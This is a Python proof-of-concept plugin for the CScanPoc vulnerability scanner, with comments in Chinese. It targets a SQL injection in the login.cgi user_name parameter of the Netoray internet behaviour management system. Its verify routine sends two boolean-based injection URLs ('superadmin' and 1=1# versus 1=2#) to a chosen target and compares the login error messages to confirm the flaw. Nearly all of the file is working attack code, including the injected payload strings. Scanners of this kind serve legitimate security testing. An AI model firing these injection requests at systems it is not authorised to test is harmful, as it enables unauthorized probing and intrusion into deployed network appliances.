# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'Netoray_0001'  # 平台漏洞编号，留空
    name = '莱克斯科技上网行为管理系统通用注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = 'Unkonwn'  # 漏洞公布时间
    desc = '''
        莱克斯（Netoray）科技上网行为管理系统通用SQL注入漏洞。
        /login.cgi?act=login&user_name=
    '''  # 漏洞描述
    ref = 'Unkonwn'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = '莱克斯上网行为管理系统'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '5f15e67c-734f-4a04-9a99-65a7183017ff'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-26'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            hh = hackhttp.hackhttp()
            arg = self.target
            url = arg + "/login.cgi?act=login&user_name=superadmin%27%20and%201=1%23&user_pwd=123&lang=zh_CN.UTF-8&t=0.4357823623300646&loginflag=1&ajax_rnd=33058189799063725952&user_name=[object%20HTMLInputElement]&session_id=undefined&lang=[object%20HTMLSelectElement]"
            code, head, res1, errcode, _ = hh.http(url)
            url = arg + "/login.cgi?act=login&user_name=superadmin%27%20and%201=2%23&user_pwd=123&lang=zh_CN.UTF-8&t=0.4357823623300646&loginflag=1&ajax_rnd=33058189799063725952&user_name=[object%20HTMLInputElement]&session_id=undefined&lang=[object%20HTMLSelectElement]"
            code, head, res2, errcode, _ = hh.http(url)

            if code == 200 and '密码错误!' in res1 and '帐号不存在!' in res2:
                #security_hole("莱克斯科技上网行为管理系统通用注入:%s"%url)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
